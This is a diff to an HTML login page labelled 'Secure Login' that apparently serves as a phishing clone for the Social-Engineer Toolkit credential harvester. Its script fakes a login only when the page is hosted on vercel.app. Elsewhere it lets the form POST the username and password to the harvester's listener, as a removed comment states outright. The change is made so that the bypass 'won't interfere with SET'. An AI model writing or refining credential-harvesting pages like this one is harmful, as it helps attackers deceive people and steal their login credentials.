@@ -26,23 +26,20 @@
                 Invalid username or password!
             </div>
 
-            <form id="loginForm" method="POST" action="login.html">
+            <form method="post" action="login.html">
                 <div class="form-group">
                     <label for="username" style="color: var(--text-muted)"><i class="fas fa-user"></i> Username</label>
-                    <input type="text" class="form-control" id="username" name="username" placeholder="Enter your username" required autofocus autocomplete="username">
+                    <input type="text" class="form-control" name="username" id="username" placeholder="Enter your username" required autofocus>
                 </div>
                 <div class="form-group">
                     <label for="password" style="color: var(--text-muted)"><i class="fas fa-lock"></i> Password</label>
-                    <input type="password" class="form-control" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
+                    <input type="password" class="form-control" name="password" id="password" placeholder="••••••••" required>
                 </div>
-                <input type="hidden" name="step" value="1">
                 <div style="display:flex; align-items:center; gap:8px; margin-bottom:24px">
                     <input type="checkbox" id="remember" style="accent-color:var(--accent)">
                     <label for="remember" style="color:var(--text-muted); font-size:0.85rem; margin:0">Keep me logged in</label>
                 </div>
-                <button type="submit" name="submit" class="btn btn-primary" style="width:100%; padding:14px; font-weight:600; cursor:pointer; border:none">
-                    Secure Login
-                </button>
+                <input type="submit" id="submitBtn" value="Secure Login" class="btn btn-primary" style="width:100%; padding:14px; font-weight:600; cursor:pointer; border:none">
             </form>
 
             <div style="margin-top:32px; border-top:1px solid rgba(255,255,255,0.1); padding-top:24px; text-align:center; display:flex; justify-content:center; gap:24px">
@@ -53,23 +50,25 @@
     </div>
 
     <script>
-        // CRITICAL: Ensure form submits naturally on the Harvester IP
-        const loginForm = document.getElementById('loginForm');
-        const hostname = window.location.hostname;
-        
-        // Only bypass if we are strictly on the Vercel production domain
-        if (hostname.includes('vercel.app')) {
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                localStorage.setItem('loggedin', 'true');
-                localStorage.setItem('username', document.getElementById('username').value || 'User');
-                window.location.href = 'pm_dashboard.html';
-            });
-        } else {
-            // Log for debugging (visible in F12 console on the harvester)
-            console.log("SET Harvester detected on: " + hostname);
-            console.log("Form submission is UNRESTRICTED. Credentials will be POSTed to the listener.");
-        }
+        // Use a more robust bypass that won't interfere with SET
+        document.addEventListener('DOMContentLoaded', function() {
+            const hostname = window.location.hostname;
+            const isVercel = hostname.includes('vercel.app');
+            
+            if (isVercel) {
+                const btn = document.getElementById('submitBtn');
+                if (btn) {
+                    btn.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        localStorage.setItem('loggedin', 'true');
+                        localStorage.setItem('username', document.getElementById('username').value || 'User');
+                        window.location.href = 'pm_dashboard.html';
+                    });
+                }
+            } else {
+                console.log("Environment: Harvester/Local. Form will submit normally.");
+            }
+        });
     </script>
 </body>
 </html>
